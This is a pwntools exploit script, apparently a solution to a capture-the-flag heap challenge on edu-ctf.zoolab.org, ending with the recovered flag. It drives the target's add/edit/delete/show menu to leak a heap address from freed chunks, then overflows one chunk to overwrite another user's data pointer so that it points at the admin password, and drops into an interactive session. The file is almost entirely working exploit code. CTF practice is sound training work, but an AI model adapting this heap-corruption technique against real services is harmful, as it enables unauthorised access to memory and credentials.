from pwn import *

r = remote('edu-ctf.zoolab.org', 10008)
# r = process('./share/chal')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(r)

main_arena_offset = 0x1ecbe0
system_offset = 0x52290
free_hook_offset = 0x1eee48

def add(idx, name, password):
    global r
    r.sendlineafter('bye\n> ', b'1')
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("username\n> ", name)
    r.sendlineafter("password\n> ", password)
    r.recvuntil("success!\n")

def edit(idx, size, data):
    global r
    r.sendlineafter('bye\n> ', b'2')
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("size\n> ", str(size))
    r.sendline(data)
    r.recvuntil("success!\n")
    # print(f"Edited {idx}")

def delete(idx):
    global r
    r.sendlineafter('bye\n> ', b'3')
    r.sendlineafter("index\n> ", str(idx).encode())
    r.recvuntil("success!\n")
    # print(f"Deleted {idx}")

def show():
    global r
    r.sendlineafter('bye\n> ', b'4')
    all_notes = r.recvuntil("1. add_user\n")
    return all_notes

garbage = b'B'*0x8
add(1, garbage, garbage)
edit(1, 0x28, b'B'*0x28)

add(2, garbage, garbage)
edit(2, 0x28, b'B'*0x28)

delete(1)
delete(2)
stored = show()
print(stored)
heap_addr = (u64(stored.split(b'\n')[3][-6:].ljust(8, b'\x00')) >> 12) << 12
admin_passwd = heap_addr + 0x290 + 0x20
print(heap_addr)
print(f"heap addr: {hex(heap_addr)}")

garbage = b'C'*0x8

# index 3 uses the space freed from user 2
add(3, garbage, garbage)
edit(3, 0x28, b'B')

# use up the freed 1st user chunks
add(4, garbage, garbage)
edit(4, 0x28, garbage)

# new chunk after index 3
add(5, garbage, garbage)

# overwrite data pointer of user 5 -> admin password
fake_data = flat(
    garbage, garbage,
    garbage, garbage,
    0, 0x31,
    garbage, garbage,
    garbage, garbage,
    admin_passwd
)

edit(3, 0x58, fake_data)
stored = show()
print(stored)
r.interactive()

# flag{C8763}